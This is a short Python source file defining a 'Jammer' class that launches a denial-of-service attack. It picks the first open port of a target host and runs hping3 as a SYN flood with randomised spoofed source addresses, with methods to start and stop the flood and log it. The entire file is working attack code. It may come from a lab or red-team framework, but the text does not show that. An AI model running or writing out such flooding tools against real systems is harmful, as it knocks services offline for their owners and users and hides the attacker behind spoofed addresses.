import subprocess
import os
import signal
import logging

logging.basicConfig(level=logging.INFO, \
    format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class Jammer:
    def __init__(self, host): 
        self.target_ip = host.ip
        self.process = None
        if not host.ports:
            raise ValueError(
                "Host does not have any ports available for attack")
        self.port = next(iter(host.ports.keys()))

    def start_attack(self):
        command = [
            'hping3', '--syn', '--rand-source', '--flood',
            '-p', str(self.port), self.target_ip
        ]
        self.process = subprocess.Popen(command, stdout=subprocess.PIPE, \
            stderr=subprocess.PIPE)
        logger.info(f"Jamming attack started on {self.target_ip}:{self.port}")

    def stop_attack(self):
        if self.process:
            os.kill(self.process.pid, signal.SIGINT)
            self.process.wait()
            logger.info(f"Jamming stopped on {self.target_ip}:{self.port}")
            self.process = None
